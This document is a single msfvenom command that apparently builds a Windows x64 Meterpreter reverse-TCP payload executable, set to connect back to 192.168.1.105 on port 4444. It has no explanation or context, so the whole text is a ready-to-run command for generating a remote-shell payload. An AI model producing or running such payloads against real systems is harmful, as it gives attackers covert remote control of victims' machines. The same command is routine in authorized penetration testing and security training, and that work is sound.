msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=4444 -f exe > payload64.exe


